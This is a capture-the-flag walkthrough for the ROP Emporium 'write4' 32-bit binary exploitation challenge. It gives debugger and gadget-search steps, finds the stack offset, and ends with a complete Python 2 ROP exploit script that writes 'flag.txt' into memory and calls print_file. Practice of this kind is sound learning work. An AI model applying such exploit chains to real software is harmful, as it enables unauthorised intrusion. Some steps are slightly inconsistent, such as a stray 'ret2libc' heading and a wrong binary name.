[Challenge]:  https://ropemporium.com/challenge/write4.html
[Video Walkthrough]: https://www.youtube.com/watch?v=CanI14UyPbM
[PLT]: https://www.youtube.com/watch?v=kUk5pw4w0h4
[.data section]: https://www.youtube.com/watch?v=h4PNbc4SXMo
 *                ^specifically at 0:50
 * you have variable here that are initialized upon creation


### This use ret2libc

### Setup:
> 1. $ sudo apt install radare2
> 2. $ sudo apt install ropper

### Useful breakpoint when running binary in gdb
> `(gdb) break *(pwnme+146)`
* this is right before the binary reads the provided input
* might want to use `(gdb) next` to step over the read function

> `(gdb) break *(pwnme+176)`
* right before the `leave` instruction in `pwnme()`
* if done correctly you should be going to the what you entered

> `(gdb) break *(print_file)`
 * this function is entered if things function3ed correctly


[Steps]:
> 1.  $ radare2 write432
> 2.  [0xXXX]> aaaa
> 3.  [0xXXX]> afl
>     Excerpt:
>     `0x0804852a    1 25           sym.usefulFunction`
> 4.  [0xXXX]> s sym.usefulFunction
> 5.  [0xXXX]> pdf
> 6.  [0xXXX]> iS
>      Excerpt:
>      `23  0x00001000   0x18 0x0804a000   0x18 -rw- .got.plt`
>                               ^
> 7.  $ gdb callme32
> 8.  (gdb) run
> 9.  Enter this when prompted and press Enter:
>     aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
>     If using pwndbg, this string can be made: `pwndbg> cyclic 100`
> 10. Observe that the EIP register says `0x6161616c`. This is `laaa` in ASCII (remember this is Little Endian architecture so the bytes are backwards)
> 11. Calculate the offset (it's 44)
>     If using pwndbg, can find offset by: `pwndbg> cyclic -l laaa`
> 12. (gdb) disassemble usefulFunction
>     Excerpt:
>     `0x08048538 <+14>:	call   0x80483d0 <print_file@plt>`
>                                  ^
> 13. (gdb) disassemble usefulGadgets
>     Excerpt:
>     `0x08048543 <+0>:	mov    DWORD PTR [edi],ebp`
>      ^
>        OR
>     $ ropper -f write432 --search mov
>     Excerpt:
>     `0x08048543: mov dword ptr [edi], ebp; ret;`
>
> 14. (gdb) quit
> 15. $ readelf -S write432
>     Excpert:
>     `[24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4`
>                                             ^
> 16. $ ropper -f write432 --search pop
> 17. How to add hex numbers in bash:
>     `$ printf "0x%X\n" $((0x0804a018 + 0x4))`
> 18. exploit.py
```
#THIS PYTHON SCRIPT ONLY WORKS ON PYTHON2

# Gadgets
mov_gadget = "\x43\x85\x04\x08" # 0x08048543: mov dword ptr [edi], ebp; ret;
pop_gadget = "\xaa\x85\x04\x08" # 0x080485aa: pop edi; pop ebp; ret; 

# .data section
data_section = "\x18\xa0\x04\x08" # 0x0804a018
data_section_plus4 = "\x1c\xa0\x04\x08"  # 0x0804a01c
data_section_plus8 = "\x20\xa0\x04\x08"  # 0x0804a020
data_section_plus12 = "\x24\xa0\x04\x08" # 0x0804a024
data_section_plus16 = "\x28\xa0\x04\x08" # 0x0804a028

# target 'print_file' function
print_file = "\xd0\x83\x04\x08" # 0x80483d0


offset = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa"

# Start off with the offset
payload = offset

## Enter 'flag' into the .data section
payload += pop_gadget
payload += data_section
payload += "flag" # 4 characters cause this is 32 bits (4 bytes) and 1 char is 1 byte
payload += mov_gadget

## Enter '.txt' into the .data section
payload += pop_gadget
payload += data_section_plus4 # plus 4 so we don't overwrite the 4 bytes we just wrote
payload += ".txt" # 4 characters cause this is 32 bits (4 bytes) and 1 char is 1 byte
payload += mov_gadget

## Now that 'flag.txt' is in data, go to print_file function
payload += print_file
payload += pop_gadget
payload += data_section # where  'flag.txt' is


print(payload)
```
> 19. MUST BE PYTHON2!!!!
>     $ python exploit.py > payload
> 20. ./write432 < payload

[GDB Walkthrough]:
> `(gdb) break *(pwnme+146)`
> `(gdb) break *(pwnme+176)`





